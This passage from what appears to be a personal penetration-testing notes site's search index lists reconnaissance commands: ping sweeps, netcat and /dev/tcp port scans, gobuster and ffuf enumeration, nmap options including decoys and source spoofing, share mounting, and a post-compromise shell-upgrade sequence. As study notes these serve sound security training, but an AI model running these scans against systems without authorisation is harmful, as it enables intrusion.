0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/kiterunner/","summary":"Kiterunner Options ","tags":null,"title":"Kiterunner"},{"categories":null,"contents":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.10.10.7/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k - gobuster ignore certificate ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://\u0026lt;website\u0026gt;.com' -H 'Host: FUZZ.\u0026lt;website\u0026gt;.com' - ffuf vhost enumeration ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/misc/","summary":"Miscellaneous Options Miscellaneous Options for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep \u0026quot;bytes from\u0026quot; \u0026amp;); done - Scan for hosts in subnet nc -w 1 192.168.110.52 1-10000 -v -z -n 2\u0026gt;\u0026amp;1 | grep succeeded - Scan host range of ports using nc for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.1.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo $i is open; done - Scan host range of ports gobuster dir -u https://10.","tags":null,"title":"Miscellaneous"},{"categories":null,"contents":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent. -p- - Scan all ports. -p22-110 - Scan all ports between 22 and 110. -p22,25 - Scans only the specified ports 22 and 25. -F - Scans top 100 ports. -sS - Performs an TCP SYN-Scan. -sA - Performs an TCP ACK-Scan. -sU - Performs an UDP Scan. -sV - Scans the discovered services for their versions. -sC - Perform a Script Scan with scripts that are categorized as \u0026ldquo;default\u0026rdquo;. --script \u0026lt;script\u0026gt; - Performs a Script Scan by using the specified scripts. -O - Performs an OS Detection Scan to determine the OS of the target. -A - Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 - Sets the number of random Decoys that will be used to scan the target. -e - Specifies the network interface that is used for the scan. -S 10.10.10.200 - Specifies the source IP address for the scan. -g - Specifies the source port for the scan. --dns-server \u0026lt;ns\u0026gt; - DNS resolution is performed by using a specified name server. Output Options -oA filename - Stores the results in all available formats starting with the name of \u0026ldquo;filename\u0026rdquo;. -oN filename - Stores the results in normal format with the name \u0026ldquo;filename\u0026rdquo;. -oG filename - Stores the results in \u0026ldquo;grepable\u0026rdquo; format with the name of \u0026ldquo;filename\u0026rdquo;. -oX filename - Stores the results in XML format with the name of \u0026ldquo;filename\u0026rdquo;. Performance Options --max-retries \u0026lt;num\u0026gt; - Sets the number of retries for scans of specific ports. --stats-every=5s - Displays scan\u0026rsquo;s status every 5 seconds. -v/-vv - Displays verbose output during the scan. --initial-rtt-timeout 50ms - Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms - Sets the specified time value as maximum RTT timeout. --min-rate 300 - Sets the number of packets that will be sent simultaneously. -T \u0026lt;0-5\u0026gt; - Specifies the specific timing template. ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/nmap/","summary":"Nmap Options Nmap Options 10.10.10.0/24 - Target network range. -sn - Disables port scanning. -Pn - Disables ICMP Echo Requests -n - Disables DNS Resolution. -PE - Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace - Shows all packets sent and received. --reason - Displays the reason for a specific result. --disable-arp-ping - Disables ARP Ping Requests. --top-ports=\u0026lt;num\u0026gt; - Scans the specified top ports that have been defined as most frequent.","tags":null,"title":"Nmap"},{"categories":null,"contents":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/other/","summary":"Other Other Mount vhd apt install guestmount - to install be able to mount vhds guestmount --add \u0026lt;Path to vhd\u0026gt; --inspector --ro \u0026lt;mount path\u0026gt; mount -t cifs //\u0026lt;IP\u0026gt;/\u0026lt;Share\u0026gt; /mnt -o user=,password= ","tags":null,"title":"Other"},{"categories":null,"contents":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/misc/shell/","summary":"Shell Options Upgrade Shell python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;) Press CTRL+Z stty raw -echo;fg export TERM=xterm Check your terminal settings with stty -a Set columns and rows in upgraded shell to required ones stty columns \u0026lt;cols\u0026gt; stty rows \u0026lt;rows\u0026gt; ","tags":null,"title":"Shell"},{"categories":null,"contents":"SQLmap Options SQLmap Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/web_attacks/sqlmap/","summary":"SQLmap Options SQLmap Options ","tags":null,"title":"SQLmap"},{"categories":null,"contents":"Wfuzz Options ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/footprinting_and_enumeration/wfuzz/","summary":"Wfuzz Options ","tags":null,"title":"Wfuzz"}]